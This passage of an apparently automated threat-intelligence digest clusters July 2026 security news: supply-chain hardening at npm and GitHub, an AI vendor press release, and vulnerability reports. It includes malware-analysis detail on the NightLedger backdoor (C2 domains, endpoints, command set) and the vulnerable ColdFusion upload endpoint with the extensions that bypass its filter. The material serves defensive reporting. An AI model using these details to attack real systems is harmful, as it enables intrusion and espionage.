Management By Mandiant • 20-minute read Threat Intelligence The Risk of Exposed Cloud Functions and How to Harden By Mandiant • 11-minute read Threat Intelligence The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI By Mandiant • 8-minute read Threat Intelligence Google’s Continued Disruption of Malicious Residential Proxy Networks By Google Threat Intelligence Group • 5-minute read
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Updated Cyber Threat Actor Naming System
  - Published: 2026-07-24T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/
  - Summary: Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Updated Cyber Threat Actor Naming System
  - Published: 2026-07-24T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/
  - Summary: Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa

### Cluster ae0cc6b051 — score 23

- Title: Disrupting supply chain attacks on npm and GitHub Actions
- Source: GitHub Security Lab (offensive_vulnerability_research)
- Published: 2026-07-28T16:00:00+00:00
- Link: https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/
- Fetch status: ok
- Member count: 5
- Corroborating source count: 3
- Strong signals: GitHub, npm

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, supply_chain
- affected_industries: government
- affected_products: GitHub, npm
- cve_ids: CVE-2026-53921
- urgency_signals: preauth_unauth
- content_type: incident_report, news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: supply_chain, phishing_social_eng
- affected_industries: government
- affected_products: GitHub, npm
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Explore the changes we've shipped across npm and GitHub Actions over the past few months to disrupt supply chain attack techniques and limit their impact. The post Disrupting supply chain attacks on npm and GitHub Actions appeared first on The GitHub Blog .
```

#### Full body

```
Greg Ose & Zachary Steindler July 28, 2026 | 7 minutes Share: In the past year, there’s been a pattern of supply chain attacks that target weaknesses in package repositories and CI/CD systems to quickly spread malware to hundreds of open source projects. This malware seeks to exfiltrate credentials both to broadly spread the attack, as well as for later exploitation. We’ve written a few times about our plans for hardening the supply chain: Our plan for a more secure npm supply chain in September 2025, Strengthening supply chain security: Preparing for the next malware campaign in December 2025, and What’s coming to our GitHub Actions 2026 security roadmap in March 2026. In this post, we’re updating you on changes we’ve implemented that directly disrupt some of the most common and impactful supply chain attack techniques. Anatomy of supply chain attacks Supply chain attacks chain together several weaknesses, and there is no single security capability that can stop them. Addressing them takes a holistic approach, prioritizing the mitigations that break the most impactful links in the attack chain. Our teams have been studying these attacks to deploy several improvements that disrupt them and limit their impact. This is possible thanks to collaboration with the security research and developer communities. The attacks vary in how they spread across the software ecosystem. However, most of these attacks follow similar techniques to gain initial access to a project, escalate privileges, and distribute across users and software. Improvements made to npm and GitHub Actions in the past few months have been focused on cutting off specific, common techniques and providing ways for customers to identify and respond to these attacks. Initial compromise Attacks start by compromising a single project, often by directly compromising a maintainer’s account or by targeting the project’s actions workflows. npm adds preventive account protection for high-impact accounts (June 2026) : Frequently, attacks start with a phishing campaign targeting maintainers. With this change, high-impact npm accounts are now put into a read-only mode for 72 hours when they change their email or use a 2FA recovery code. This delay allows maintainers time to respond and recover the account before their account can be used to start an attack. Safer pull_request_target defaults for GitHub Actions checkout (June 2026) : A common vulnerability in a project’s CI/CD pipelines are “pwn requests,” where a workflow triggers on pull requests from forks and then executes user-submitted and untrusted code from that fork. We changed the default behavior of actions/checkout to prevent the checkout of untrusted code from forks in commonly exploited triggers unless you explicitly opt-out (after reviewing your risk). This change and its backport to older versions cut off one of the most common vulnerable code patterns leading to code execution in GitHub Actions CI/CD workflows and initial project compromise. Control who and what triggers GitHub Actions workflows (June 2026) : Maybe you’d prefer to opt-out of these risky action triggers altogether or limit who can trigger them. This new control lets you set enterprise, organization, or repository level policies on who is allowed to trigger workflows and what trigger types are allowed. These workflow execution policies provide a governable and customizable layer of least-privilege around Action workflows that reduce the attack surface of your CI/CD infrastructure. Read-only Actions cache for untrusted triggers (June 2026) : After an attacker has achieved code execution in an Actions workflow, they then look to escalate to more privileged workflows (and therefore credentials) through poisoning the cache entries shared across workflows. With this change, we restrict the ability for less trusted workflows to modify the cache shared with other workflows. This directly closes a common path attackers have used to turn a vulnerability with li
```

#### Corroborating sources (3)

- **GitHub Security Lab** (offensive_vulnerability_research)
  - Title: Disrupting supply chain attacks on npm and GitHub Actions
  - Published: 2026-07-28T16:00:00+00:00
  - Link: https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/
  - Summary: Explore the changes we've shipped across npm and GitHub Actions over the past few months to disrupt supply chain attack techniques and limit their impact. The post Disrupting supply chain attacks on npm and GitHub Actions appeared first on The GitHub Blog .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Two Compromised joyfill npm Packages Run RAT When Imported Into Node.js
  - Published: 2026-07-29T04:20:57+00:00
  - Link: https://thehackernews.com/2026/07/two-compromised-joyfill-npm-packages.html
  - Summary: Beta release versions of two npm packages in the @joyfill namespace have been compromised to deliver a remote access trojan (RAT) associated with the DEV#POPPER malware family. The list of affected packages is as follows - @joyfill/layouts@0.1.2-2773.beta.0 @joyfill/components@4.0.0-rc24-2773-beta.4 The two packages "contain an import-time JavaScript implant that resolves encrypted code
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: GitHub issues $100,000 bounty for critical RCE vulnerability
  - Published: 2026-07-22T22:21:24+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
  - Summary: submitted by /u/ryanmerket [link] [comments]

### Cluster 3574a7b873 — score 20

- Title: TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching
- Source: Trend Micro Research (threat_research_primary)
- Published: 2026-07-24T19:41:00+00:00
- Link: https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
- Fetch status: ok
- Member count: 9
- Corroborating source count: 9
- Strong signals: Anthropic/Claude

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: AWS, Anthropic/Claude, Google Cloud
- cve_ids: CVE-2026-46331
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_2_operator, tier_3_analysis, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_industries: government
- affected_products: Anthropic/Claude, AWS
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Full body

```
arrow_back search close Newsroom Media Coverage Global Press Releases Local Press Releases Stay connected with press releases from Trend teams in your region. Media Contacts Investor Relations TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching As a participant in Anthropic's Cyber Verification Program, TrendAI applies frontier reasoning to convert vulnerability intelligence into faster protection across hybrid environments DALLAS , July 24, 2026 / PRNewswire / -- TrendAI™, the enterprise AI security leader from Trend Micro Incorporated (TYO: 4704; TSE: 4704), today announced it is adopting Claude Opus 5, Anthropic's latest and most capable Opus model, to help security teams convert vulnerability intelligence into immediate protection, from prioritization to virtual patching. The move builds on TrendAI's collaboration with Anthropic on Claude Opus 4.8, extending the same defensive focus to a model that delivers step-change gains in advanced reasoning, agentic workflows, and long-horizon analysis. As AI makes finding vulnerabilities easier than ever, the harder problem becomes protecting organizations faster than software can be permanently patched, and that is where TrendAI is putting Opus 5 to work. As a participant in Anthropic's Cyber Verification Program, which credentials organizations for the defensive use of frontier AI models, TrendAI is positioned to apply Claude Opus 5 to defensive security as access becomes available. The model is Zero Data Retention compatible, supporting TrendAI's governance and data-protection requirements as it scales AI across security operations. The work extends to TrendAI Threat Research, where frontier AI models are combined with our proprietary frontier intelligence engine and human expertise to generate pre-disclosure intelligence. Those insights power TrendAI Vision One™, delivering stronger detection, deeper forensic insights, and proactive protection through virtual patching. Rachel Jin, Chief Platform and Business Officer, Head of TrendAI™: "With Claude Opus 5, TrendAI can move from vulnerability intelligence to action faster than ever, prioritizing what matters most by exploitability and business impact. Finding the vulnerability was always the hard part. Now the challenge is protecting organizations faster than software can be permanently patched, and frontier reasoning is what changes that equation, extending all the way to virtual patching that protects customers before a vendor fix ships. This is what it means to secure the AI age, fearlessly." These capabilities support TrendAI Vision One™ in helping security analysts, AppSec teams, and SOC teams prioritize exposure, map attack paths, and accelerate mitigation, including virtual patching, across hybrid environments, moving vulnerability management from a static scanning process into a faster, context-aware risk mitigation workflow. About TrendAI™ TrendAI™, the global AI security leader and enterprise business unit of Trend Micro, empowers organizations with full AI visibility and consolidated security that inspires confidence, drives innovation, and eliminates risk. Trusted by the largest enterprises and governments across 185 countries, TrendAI™ secures the entire organization, from identities, to infrastructure, to data. Global Fortune 500 companies rely on TrendAI™ to cut risk and stop threats up to three months earlier, powered by world-leading threat and attack intelligence. Through deep ecosystem partnerships with market leaders like NVIDIA, Anthropic, AWS, Google, and Microsoft, TrendAI™ empowers your organization to securely drive forward at the speed of AI. AI Fearlessly. Learn more: trendaisecurity.com About Anthropic Anthropic is an AI safety and research company dedicated to building reliable, interpretable, and steerable AI systems. Its Claude family of models, including Claude Opus 5, enables advanced capabilities across a wide range of applications, including code understandi
```

#### Corroborating sources (9)

- **Trend Micro Research** (threat_research_primary)
  - Title: TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching
  - Published: 2026-07-24T19:41:00+00:00
  - Link: https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
- **Intel 471** (ransomware_ecrime_financial_crime)
  - Title: AI Threat Detection Is Not Enough Without Adversary Intelligence
  - Published: 2026-07-22T19:30:00+00:00
  - Link: https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
  - Summary: The 2026 emergence of Anthropic’s Claude Mythos Preview showed security leaders that AI can now find software vulnerabilities faster than the humans responsible for patching them.
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Escaping Claude Cowork’s local VM sandbox via CVE-2026-46331
  - Published: 2026-07-24T05:53:48+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/
  - Summary: submitted by /u/natcoba [link] [comments]
- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Boris Cherny
  - Published: 2026-07-25T00:42:59+00:00
  - Link: https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
  - Summary: More than any of these eval scores, what is most exciting to me is something else: Opus 5 is our least prompt injectable model yet. It is a bit buried in the system card, but across PI evals and red teaming, Opus 5 is very hard to prompt inject successfully. — Boris Cherny , here's that System Card section , page 73 Tags: prompt-injection , anthropic , claude , generative-ai , ai , llms , boris-cherny
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Contrast CVE Shield aims to protect applications while security teams deploy patches
  - Published: 2026-07-29T11:06:05+00:00
  - Link: https://www.helpnetsecurity.com/2026/07/29/contrast-security-cve-shield/
  - Summary: Contrast Security has announced Contrast CVE Shield, designed to help organisations defend against the growing number of exploits generated with advanced AI models such as Claude Mythos. Contrast CVE Shield runs inside the application, where it detects, monitors and blocks attempts to exploit known vulnerabilities. Applications continue to function normally while security teams gain visibility into which vulnerabilities are present, which are being targeted and which exploitation attempts have been prevented. Using a runtime microsandbox … More → The post Contrast CVE Shield aims to protect applications while security teams deploy patches appeared first on Help Net Security .
- **Schneier on Security** (practitioner_analysis)
  - Title: Measuring LLMs’ Ability to Perform Cryptanalysis
  - Published: 2026-07-29T01:47:05+00:00
  - Link: https://www.schneier.com/blog/archives/2026/07/measuring-llms-ability-to-perform-cryptanalysis.html
  - Summary: There’s new benchmark measuring AI’s ability to perform mathematical cryptanalysis. Anthropic’s frontier model actually found new attacks. The benchmark: “ CryptanalysisBench: Can LLMs do Cryptanalysis? ” The idea is to benchmark the ability of LLMs to discover new mathematical cryptanalytic attacks against a series of historical algorithms. Abstract: Cryptanalysis—the task of finding attacks against cryptographic schemes—its at the intersection of mathematical reasoning and cybersecurity, two areas where LLMs have advanced fastest. Cryptanalysis represents both a clean testbed for frontier reasoning (as practical attacks can be automatically verified) and a domain with unusually high stakes, since the primitives under study underpin our digital security. In this paper we ask whether LLMs can do cryptanalysis, and find that the answer is increasingly yes. We introduce CryptanalysisBench, 191 tasks across six families of cryptographic primitives (block ciphers, hash functions, etc.) dra
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Claude AI Just Cracked a Post-Quantum Test Scheme and Found a Faster 7-Round AES Attack
  - Published: 2026-07-28T18:59:07+00:00
  - Link: https://thehackernews.com/2026/07/claude-ai-just-cracked-post-quantum.html
  - Summary: Anthropic says Claude Mythos Preview helped derive an end-to-end key-recovery attack against HAWK-256 and a 200- to 800-fold speedup for an attack on seven-round AES-128. The HAWK attack exploits a previously unused symmetry in the lattice behind the signature scheme. Anthropic's released implementation gives an expected end-to-end runtime of about three hours and 42 minutes on a 96-core server
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: FBI sees Anthropic’s Mythos as a law enforcement challenge
  - Published: 2026-07-28T17:18:29+00:00
  - Link: https://fedscoop.com/fbi-anthropic-mythos-law-enforcement-challenge/
  - Summary: The post FBI sees Anthropic’s Mythos as a law enforcement challenge appeared first on CyberScoop .
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: What’s new with Google Cloud
  - Published: 2026-07-24T16:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
  - Summary: Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Jul 20 - Jul 24 Claude Opus 5, Anthropic’s latest model, is now available on Agent Platform. It brings performance improvements over Opus 4.8 across coding, long-running agents, and knowledge work.The model is Zero Data Retention (ZDR) compatible. For safety, high-risk workflows — such as penetration testing or exploit generation — it will notify you and fall back to Opus 4.8.We’re excited to continue to offer enterprise customers options across frontier models to build, deploy, and scale AI securely. Try it here . Apigee Northam Roadshow 2026 | The AI Agent Evolution: Powering Tomorrow's Enterprise AI is evolving.

### Cluster 712529d9fa — score 20

- Title: Mirage Kitten targets Middle East and Africa region with new malware
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-07-28T08:00:20+00:00
- Link: https://securelist.com/mirage-kitten-new-tools/120811/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Nimbus Manticore, UNC1549

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, web_shell_backdoor
- actor_attribution: Nimbus Manticore, UNC1549
- affected_industries: aviation_defense, telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage, web_shell_backdoor
- actor_attribution: Nimbus Manticore, UNC1549
- affected_industries: telecommunications, aviation_defense
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky researchers reveal previously undocumented malware attributed to Mirage Kitten (UNC1549, Smoke Sandstorm, Nimbus Manticore): NightLedger backdoor, ArcBridge, and BridgeHead tunneling tools.
```

#### Full body

```
Table of Contents Introduction Technical details NightLedger backdoor BridgeHead – a WebSocket tunneler ArcBridge: another WebSocket tunneling tool Victimology Conclusion Indicators of compromise File hashes Domains and IPs Authors Omar Amin Vasily Berdnikov Introduction Mirage Kitten – also known as UNC1549, Smoke Sandstorm, and Nimbus Manticore – is an advanced persistent threat (APT) group focused on cyber-espionage operations against aerospace, aviation, defense, and telecommunications sectors across the Middle East and Africa, using highly targeted spear-phishing campaigns, fake recruitment portals, and custom multi-stage malware to gain persistent access and exfiltrate sensitive data. During recent threat research, we identified a previously undocumented malware set developed and used by Mirage Kitten. The toolset includes NightLedger, a new Windows backdoor for reconnaissance, command execution, file operations, process discovery, and screenshot capture; and two custom WebSocket-based tunnelers, ArcBridge and BridgeHead, for covert network access and operator-controlled tunneling. Technical details Although the initial access vector remains unclear for most malware samples observed in this activity, we saw BridgeHead being deployed during post-exploitation activities in victim environments in Egypt and at a Pakistan-based aerospace and aviation organization. The deployment followed targeted spear-phishing activity consistent with tradecraft we recently documented as part of our private threat intelligence reporting service and publicly reported by Unit 42 and Check Point Research , including the use of highly tailored social engineering lures against selected targets. These lures included recruitment-themed content impersonating trusted brands and hiring platforms, as well as lookalike videoconferencing pages that redirected victims to malicious archives hosted on third-party file-sharing services. NightLedger backdoor NightLedger is a recently identified Windows backdoor that we attribute to Mirage Kitten based on code and behavioral similarities to the historical implants developed and used by the group. The implant masquerades as SspiCli.dll and appears to be designed for DLL search-order hijacking, targeting a legitimate AppVShNotify.exe binary. While AppVShNotify.exe does not directly import SspiCli.dll , it imports RPCRT4.dll , which can delay-load SspiCli.dll when it invokes an RPC API that requires authentication. This allows a co-located malicious SspiCli.dll to be loaded while forwarding expected exports to the legitimate DLL. When started, the malicious DLL creates the mutex A8215357-F99A-44FE-BC65-D8F0434B0C03 to enforce a single running instance. If the mutex already exists, it exits immediately. NightLedger periodically contacts its C2 over HTTPS, issuing an HTTP GET request to the /edfcvfgbhnjmkqwasderfgg endpoint at the realhealthshop[.]com domain, and uses tjconsultingservices[.]com as a fallback C2. When a valid C2 response is received, the implant tokenizes the payload using the custom delimiter (#%%#) and passes the parsed fields to its command dispatcher. From a development standpoint, this is similar to TWOSTROKE, a backdoor attributed to the same APT and previously documented by GTIG , whose C2 response is hex-encoded and uses (@##@) as a field separator. NightLedger supports the following commands: Command ID Description 1 Gather user and host identity information 3 Execute a process/program 17 List directories 20 Download a file to the infected system 25 Gather host and network information 27 Copy a file 30 Update beacon interval 36 Take a screenshot 43 Load a DLL 56 Kill a process 62 Delete a file 69 Terminate thread 70 Upload file to C2 server via POST request to /qasxcdfvgbhnmyuioplkhnj 75 Enumerate logical drives 90 List processes 93 Collect C:\Windows\debug\NetSetup.log together with process-list output. NetSetup.log is a Windows diagnostic log generated under C:\Windows\debug\ during domai
```

#### Corroborating sources (2)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Mirage Kitten targets Middle East and Africa region with new malware
  - Published: 2026-07-28T08:00:20+00:00
  - Link: https://securelist.com/mirage-kitten-new-tools/120811/
  - Summary: Kaspersky researchers reveal previously undocumented malware attributed to Mirage Kitten (UNC1549, Smoke Sandstorm, Nimbus Manticore): NightLedger backdoor, ArcBridge, and BridgeHead tunneling tools.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Nimbus Manticore Deploys NightLedger and Turns Victim Systems Into Covert Relays
  - Published: 2026-07-28T11:55:20+00:00
  - Link: https://thehackernews.com/2026/07/nimbus-manticore-deploys-nightledger.html
  - Summary: The Iranian state-backed hacking group tracked as Nimbus Manticore (aka GalaxyGato, Mirage Kitten, Smoke Sandstorm, Subtle Snail, and UNC1549) has been attributed to a fresh set of attacks targeting entities across the Middle East, Africa, and South Asia. The intrusions involve the use of a previously undocumented Windows backdoor called NightLedger and two custom WebSocket tunnelers,

### Cluster dd6691160d — score 19

- Title: ColdFusion Under Fire: Breaking Down CVE-2026-48283 and CVE-2026-48313
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-28T16:12:25+00:00
- Link: https://horizon3.ai/intelligence/blogs/coldfusion-critical-cves/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-48283, CVE-2026-48313

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_industries: education, financial_services, government, healthcare
- cve_ids: CVE-2026-48283, CVE-2026-48313
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_industries: healthcare, financial_services, government, education
- cve_ids: CVE-2026-48283, CVE-2026-48313
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Learn how the critical ColdFusion vulnerabilities CVE-2026-48283 and CVE-2026-48313 work, how attackers can exploit them, and why verifying remediation is essential for reducing real-world risk.
```

#### Full body

```
ColdFusion Under Fire: Breaking Down CVE-2026-48283 and CVE-2026-48313 Rey Bango July 28, 2026 Blogs By Rey Bango & Brandon Peterson Adobe ColdFusion has been a fixture in enterprise web application stacks for decades. The first version of the web application server was released in 1995, and I have to admit I had fond memories of building web apps using the product. I still love CFML (yes, I said it!). So you can imagine how Adobe’s latest security bulletin piqued my interest. Apart from my past experience, government agencies, healthcare organizations, financial services firms, and higher education institutions have built and hosted dynamic web applications on it for years. That longevity is precisely what makes a pair of vulnerabilities worth paying close attention to. CVE-2026-48283 and CVE-2026-48313 are two critical, unauthenticated vulnerabilities affecting Adobe ColdFusion 2025 (Update 9 and earlier) and ColdFusion 2023 (Update 20 and earlier). Neither requires an attacker to have valid credentials or that a user clicks anything. And at least one of them results in remote code execution on the ColdFusion host. When the Horizon3.ai Rapid Response team evaluated these vulnerabilities, NodeZero® was able to exploit CVE-2026-48283 and achieve host compromise in under 90 seconds. That result warrants a closer look at what these vulnerabilities actually are, how they work, and what defenders should do about them. CVE-2026-48283: From File Upload to NT AUTHORITY\SYSTEM Uploading files, like images, documents and such are par for the course in many web applications. It’s used for everything from updating your profile picture to sending over a copy of your resume when applying for a job. The main thing that is important is that your development and security teams consider the types of files that should be uploaded and implement proper sanitization capabilities to limit those to only what’s necessary. Otherwise, you run the risk of an attacker uploading a webshell that could let them take over the server. Which leads us to CVE-2026-48283. This is a vulnerability that outlines a failure in ColdFusion’s file upload handling to properly restrict the types of files that can be submitted to the server. The vulnerability carries a CVSS score of 10.0, so you can understand that it has serious consequences when it appears in an internet-facing application. Digging into the issue, an unauthenticated remote attacker can upload a malicious file to a ColdFusion server without any prior authentication and without any user interaction on the target side. ColdFusion includes the CKEditor filemanager connector, a server-side component that acts as a bridge between CKEditor’s file browser UI and your web server’s file system. It helps with tasks within the ColdFusion administration interface like file browsing and management. It was a feature added to ColdFusion around 2007 and continues to be a part of helping make administration easier for developers. I remember using it when I managed some ColdFusion servers and it was a marked user interface improvement over the Flash components. Unfortunately, it also shipped an endpoint that allowed for unauthenticated file uploads: /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm The breakdown happened in ColdFusion’s file handling, which relied heavily on checking file extensions against disallowed lists. The parser failed to sanitize or validate specific file extensions or composite extensions before dropping the payload onto the file system. By default, .cfm,.cfc and .jsp are generally restricted on standard user uploads because these files tend to contain the code that powers your application. Unfortunately, some legacy server endpoints or internal RPC handling permitted alternative or unmapped executable types such as .jspf, .cfmail, or Java archive formats like .war. Yes, ColdFusion supports Java Server Pages and archive formats since it’s powered by a Java server under the hood. Of c
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: ColdFusion Under Fire: Breaking Down CVE-2026-48283 and CVE-2026-48313
  - Published: 2026-07-28T16:12:25+00:00
  - Link: https://horizon3.ai/intelligence/blogs/coldfusion-critical-cves/
  - Summary: Learn how the critical ColdFusion vulnerabilities CVE-2026-48283 and CVE-2026-48313 work, how attackers can exploit them, and why verifying remediation is essential for reducing real-world risk.

### Cluster 4f7846fb3b — score 19

- Title: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169 & CVE-2026-60170 | Oracle Hospitality Simphony Multiple Vulnerabilities
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-22T19:32:52+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/oracle-hospitality-simphony-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- cve_ids: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Learn about four remotely exploitable Oracle Hospitality Simphony vulnerabilities and how NodeZero Rapid Response helps validate exposure and verify remediation.
```

#### Full body

```
Oracle Hospitality Simphony Multiple Vulnerabilities Oracle’s July 2026 Critical Patch Update addresses four remotely exploitable vulnerabilities affecting Oracle Hospitality Simphony. Discovered and responsibly disclosed by Horizon3.ai researcher Jimi Sebree, the vulnerabilities affect two Simphony components: the EGateway Printing Handler and the Kiosk application. Together, they provide multiple paths for unauthenticated attackers to compromise vulnerable systems, including NTLM hash disclosure, arbitrary file writes, authentication bypass, and arbitrary code execution. The vulnerabilities include: CVE-2026-60167: UNC path coercion resulting in NTLM hash disclosure CVE-2026-60168 & CVE-2026-60169: Related vulnerabilities that together enable arbitrary file writes through the EGateway Printing Handler CVE-2026-60170: Authentication bypass affecting the Simphony Kiosk application that can lead to arbitrary code execution Oracle Hospitality Simphony is widely deployed across hospitality chains, quick-service restaurants, stadiums, casinos, hotels, and other food service environments. Because these systems frequently reside on networks that process payment card data and connect to enterprise infrastructure, successful exploitation may enable lateral movement, persistence, credential compromise, or complete host compromise. There are currently no confirmed reports of active exploitation in the wild. Stop Guessing, Start Proving Schedule a demo Technical Details Although Oracle assigned four separate CVE identifiers, the vulnerabilities fall into two functional groups affecting different Simphony components. CVE-2026-60167: UNC Path Coercion CVE-2026-60167 affects the EGateway Printing Handler. Improper validation of user-controlled input allows an unauthenticated attacker to supply a crafted UNC path that causes the Simphony host to initiate an outbound SMB connection to an attacker-controlled server. Windows may automatically transmit NTLM authentication material during this connection. Captured NTLM hashes may be cracked offline or relayed to other systems, potentially facilitating credential compromise and lateral movement. Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: NTLM hash disclosure CVE-2026-60168 & CVE-2026-60169: Arbitrary File Write CVE-2026-60168 and CVE-2026-60169 affect the EGateway Printing Handler. The vulnerabilities result from insufficient validation of attacker-controlled input before file operations are performed. Oracle assigned two CVEs to distinct weaknesses within the processing chain that together create a single arbitrary file write condition. An unauthenticated attacker can submit crafted requests that cause arbitrary files to be written to the underlying host. Successful exploitation may allow an attacker to: Write attacker-controlled files Establish persistence Prepare the system for subsequent code execution Facilitate additional compromise Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: Arbitrary file write CVE-2026-60170: Authentication Bypass CVE-2026-60170 affects the Simphony Kiosk application. Improper validation of user-controlled input allows an unauthenticated attacker to bypass authentication and gain access to the Kiosk administrator console. Horizon3.ai research demonstrated that this unauthorized administrative access can be leveraged to execute arbitrary code on the underlying host. Successful exploitation may enable an attacker to: Execute arbitrary code Establish persistence Access locally available data Use the compromised system as a foothold for additional attacks Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: Authentication bypass leading to arbitrary code execution NodeZero® Proactive Security Platform — Rapid Response A single NodeZero Rap
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169 & CVE-2026-60170 | Oracle Hospitality Simphony Multiple Vulnerabilities
  - Published: 2026-07-22T19:32:52+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/oracle-hospitality-simphony-vulnerabilities/
  - Summary: Learn about four remotely exploitable Oracle Hospitality Simphony vulnerabilities and how NodeZero Rapid Response helps validate exposure and verify remediation.

### Cluster e1d5f27f6c — score 19

- Title: Arista patches VeloCloud Orchestrator zero-day exploited in attacks
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-27T22:49:44+00:00
- Link: https://www.bleepingcomputer.com/news/security/arista-patches-velocloud-orchestrator-zero-day-exploited-in-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: government
- cve_ids: CVE-2026-16812
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
